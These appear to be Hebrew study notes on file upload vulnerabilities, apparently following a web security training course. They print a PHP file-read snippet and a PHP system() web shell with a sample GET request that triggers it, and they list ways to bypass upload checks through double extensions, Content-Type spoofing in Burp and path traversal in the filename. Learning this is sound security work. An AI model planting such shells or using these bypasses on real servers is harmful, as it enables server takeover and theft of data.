פגיעויות בהעלאת קבצים (file upload vulnerabilities) הן כאשר השרת מאפשר למשתמשים לעלות קבצים  למערכת בלי אימות כמו סוג, גודל, תוכן  אי אכיפה  של המגבלות האלה עלולה לכך  פונקציית עלאת קבצים של תמונות בסיסות תוכל לשמש כvulnerabilities.
איך ננצל פריצה כזאת ?
אפשר לעלות סקריפט לשרת שמאפשר לנו לבציע קוד מרחוק.
איך  נוצרות פגיעויות בהעלאת קבצים?
בדרך כלל נדיר שמפתחים לא שמים מגבלות בכלל על הקבצים שמשתמשים רשאים לעלות. בדרך כלל מפתחים יסיימו מגבלות שהם חושבים שהן חזקות אבל מטבע המגבלות האלה ניתן לעקוף אותן.
עם הצלחנו להשיג web shell  יש לנו שליטה מלאה על אתר לקורא קבצים רגישיים לעורך קבצים ולקבל  וכו, אפילו להשתמש בשרת כדאי לתקוף תשתית פינמית ושרתים מחוץ לשרת 

הסכנה הכי גדולה: העלאת web shell = כאשר אתר אינטרנט מאפשר לך להעלות סקריפטים בצד השרת, כגון קבצי PHP, Java או Python, וגם מוגדר להריץ אותם כקוד ואז אפשק לקבל  שליטה מלאה על השרת מרחוק אפשר להריץ פקודות, לקרוא קבצים, לגנוב מידע, לזוז הלאה ברשת (lateral movement).
לדוגמה : ניתן להשתמש במשפט PHP הבא כדי לקרוא קבצים ממערכת הקבצים של השרת,
`<?php echo file_get_contents('/path/to/target/file'); ?>`
לאחר העלאתו, שליחת בקשה לקובץ זדוני זה תחזיר את תוכן קובץ היעד בתגובה.

דוגמה לshell: 
```<?php echo system($_GET['command']); ?>```
סקריפט זה מאפשר לך להעביר פקודת מערכת.

דוגמה פרמטר:
קריפט זה מאפשר לך להעביר פקודת מערכת דרך פרמטר שאילתה באופן הבא:
```GET /example/exploit.php?command=id HTTP/1.1```

לדוגמה : אתר מאפשר להעלות תמונת פרופיל האתר בודק שהקובץ הוא .jpg בלבד
איך עוקפים הגנות בסיסיות:
1. לוקחים קובץ PHP זדוני: shell.php
2. משנים את השם ל: shell.php.jpg
3. האתר רואה .jpg = מאשר
4. אבל השרת מריץ את זה כ PHP

או דרך Burp:
1. מעלים shell.jpg
2. תופסים את הבקשה ב Burp
3. משנים את שם הקובץ ל shell.php
4. משנים את Content-Type ל image/jpeg
5. השרת מאמין שזו תמונה = מאפשר
6. בפועל העלנו PHP shell לשרת

- **Path Traversal + File Upload:** לפעמים השרת מעלה את הקובץ לתיקייה שאי אפשר להריץ ממנה קוד. במקרה כזה, ננסה לשנות את שם הקובץ ל-`../shell.php` כדי "לזרוק" אותו לתיקייה גבוהה יותר שכן מאפשרת הרצה.

Exploiting flawed validation of file uploads: #Exploiting_flawed_validation_of_file_uploads
צול אימות לקוי של העלאות קבצים (Exploiting flawed validation of file uploads) בעולם האמיתי סיכוי נמוך שנמצא אתר שאין לו הגנה על העלות קבצים, אבל זה לא אומר שאם ראינו שיש הגנה אז אין פריצה לפעמים עדיין נוכל לנצל פגיעות במנגנונים אלה עדי להשיג shell code.
Flawed file type validation: #Flawed-file-type-validation
בעת שליחה של html הדפדפן בדרך כלל שולח את הנתונים שסופקו בpost  עם סוג התוכן `application/x-www-form-urlencoded` שזה אומר שהדפדפן שולח רק את מה שצריך ומתאים את עצמו לגודל הבקשה עם זאת יש לזה הגבלה ולא יכול להכיל קבצים גדולים או כמיות גדולות במקרה שרוצים קבצים גדולים משתמשים ב `multipart/form-data`  
הקשר לפריצה:
האתר מצפה לתמונה ב multipart/form-data
אבל הוא סומך על מה שאתה אומר לו
אז במקום תמונה — שולחים קובץ PHP
האתר פותח את המעטפה, שומר את הקובץ
בלי לבדוק מה בתוכו = פריצה.
דוגמה לבקשה כזאת: 
```
POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--

```
כפי שניתן לראות, גוף ההודעה מחולק לחלקים נפרדים עבור כל אחד מהקלטים בטופס. כל חלק מכיל כותרת Content-Disposition, המספקת מידע בסיסי על שדה הקלט שאליו הוא מתייחס. חלקים בודדים אלה עשויים להכיל גם כותרת Content-Type משלהם, אשר מציין לשרת את סוג ה-MIME של הנתונים שנשלחו באמצעות קלט זה.
MIME =  סוג הקובץ שהדפדפן מצהיר לשרת.
דרך אחת שבה אתרים עשויים לנסות לאמת העלאות קבצים היא לבדוק שכותרת Content-Type הספציפית לקלט תואמת לסוג MIME הצפוי.
אם השרת מצפה רק לקבצי תמונה, לדוגמה, ייתכן שהוא יאפשר רק סוגים כמו image/jpeg ו-image/png. בעיות עלולות להיווצר כאשר הערך של כותרת זו  יודע מראש על ידי השרת . אם לא מתבצע אימות נוסף כדי לבדוק האם תוכן הקובץ אכן תואם לסוג ה-MIME המשוער, ניתן לעקוף בקלות הגנה זו באמצעות כלים כמו Burp Repeater.
